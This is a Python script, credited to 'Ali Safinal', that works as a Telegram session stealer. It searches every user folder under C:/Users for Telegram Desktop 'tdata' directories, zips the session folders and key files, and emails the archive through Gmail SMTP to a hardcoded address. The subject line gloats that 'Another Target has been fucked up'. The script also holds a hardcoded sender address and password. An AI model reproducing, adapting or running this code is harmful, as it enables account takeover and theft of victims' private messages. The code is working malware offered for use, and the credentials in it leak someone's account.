# Script by Ali Safinal
import email
import smtplib
import ssl
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import os
from zipfile import ZipFile
from os.path import basename
import shutil


def send_gmail_with_file(subject, body, sender_email, receiver_email, password, filename):
    message = MIMEMultipart()
    message["From"] = sender_email
    message["To"] = receiver_email
    message["Subject"] = subject
    message["Bcc"] = receiver_email

    message.attach(MIMEText(body, "plain"))

    with open(filename, "rb") as attachment:
        part = MIMEBase("application", "octet-stream")
        part.set_payload(attachment.read())

    encoders.encode_base64(part)

    part.add_header("Content-Disposition",
                    f"attachment; filename= {filename}",)

    message.attach(part)
    text = message.as_string()

    context = ssl.create_default_context()
    with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
        server.login(sender_email, password)
        server.sendmail(sender_email, receiver_email, text)


def main():
    counter = 0
    for i in os.walk('C:/Users'):
        if 'tdata' in i[1]:

            dirs = [(os.path.join(os.path.join(i[0], 'tdata'), dI), dI) for dI in os.listdir(os.path.join(i[0], 'tdata')) if os.path.isdir(os.path.join(
                os.path.join(i[0], 'tdata'), dI)) and dI.find('dumps') == -1 and dI.find('emoji') == -1 and dI.find('user_data') == -1 and dI.find('tdummy') == -1]

            files = [os.path.join(os.path.join(i[0], 'tdata'), dI) for dI in os.listdir(os.path.join(
                i[0], 'tdata')) if not os.path.isdir(os.path.join(os.path.join(i[0], 'tdata'), dI)) if dI == 'key_datas' or dI[:-1] in [x[1] for x in dirs]]

            count = 0
            dir_names = []
            for j in dirs:
                count += 1
                dir_names.append(j[1])
                shutil.make_archive(f'{dir_names[-1]}', 'zip', j[0])

            counter += 1
            with ZipFile(f'recieved{counter}.zip', 'w') as zipObje:
                for j in range(1, count+1):
                    zipObje.write(f'{dir_names[j-1]}.zip')
                for j in files:
                    zipObje.write(j, basename(j))

            for i in range(1, count+1):
                if os.path.exists(f'{dir_names[i-1]}.zip'):
                    os.remove(f'{dir_names[i-1]}.zip')

    with ZipFile('final.zip', 'w') as zipObj1:
        for i in range(1, counter+1):
            zipObj1.write(f'recieved{i}.zip')

    for i in range(1, counter+1):
        if os.path.exists(f'recieved{i}.zip'):
            os.remove(f'recieved{i}.zip')

    # if you want to get the email change 'robdin64@gmail.com' to your email
    send_gmail_with_file("Another Target has been fucked up!!!", "Look what do we have here!",
                         'howy9914@gmail.com', 'robdin64@gmail.com', 'slgdaldagpf658416', "final.zip")
    if os.path.exists('final.zip'):
        os.remove('final.zip')


main()

# Script by Ali Safinal
